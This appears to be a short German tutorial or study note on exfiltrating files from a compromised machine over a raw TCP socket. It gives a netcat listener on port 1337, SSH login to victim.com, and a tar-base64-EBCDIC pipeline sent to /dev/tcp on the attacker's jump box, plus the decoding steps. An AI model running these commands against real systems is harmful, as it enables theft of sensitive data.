---
title: 'Datenextraktion via TCP-Socket'
description: ''
pubDate: 'Dec 13 2025'
---

## TCP-Kommunikation

Gegeben: 2 Maschinen (A, B). A horcht auf TCP-Port 1337 (Listener). B verbindet sich zu A auf TCP/1337. A etabliert die Verbindung. Die Verbindung kann nun zum Senden/Empfangen verwendet werden.
A kann die Angreifermaschine oder eine sog. "Jump Box" darstellen. 

## Ablauf

Vorsicht: TCP-Sockets können einfach überwacht werden, weshalb sich die Methode leicht detektieren lässt. Desweiteren basiert die Methode auf Nicht-standard-Protokollen. Vorteil: Daten werden während der Übetragung enkodiert.
Der Angreifer erstellt einen TCP-Listener in der Jump-Box (j):
```
# Über Port 1337 erhaltene Daten werden nach /tmp/received.data geschrieben
j$> nc -lvp 1337 > /tmp/received.data
```
Der Angreifer verbindet sich auf B:
```
j$> ssh compromised@victim.com
- or -
a$> ssh compromised@victim.com -p [port]
```
Der Angreifer exfiltriert die Daten via TCP-Socket:
```
# tar zcf - [directory] erstellt  ein TAR-archiv der zu exfiltrierenden Dateien
# z = komprimieren, c = erstellen (create), f = archive file
# | base 64: konvertiert das TAR-archiv in eine Base64-Repräsentation
# | dd conv=ebcdic: EBCDIC Enkodierung
# > /dev/tcp: TCP-Sockettransfer

v$> tar zcf - sensitive/ | base64 | dd conv=ebcdic > /dev/tcp/[IP|j]/1337
```

Der Angreifer konvertiert die erhaltenen Daten in ihre ursprüngliche Repräsentation:
```
a$> cd /tmp/ && dd conv=ascii if=received.data | base64 -d > received.tar
a$> tar xvf received.tar
```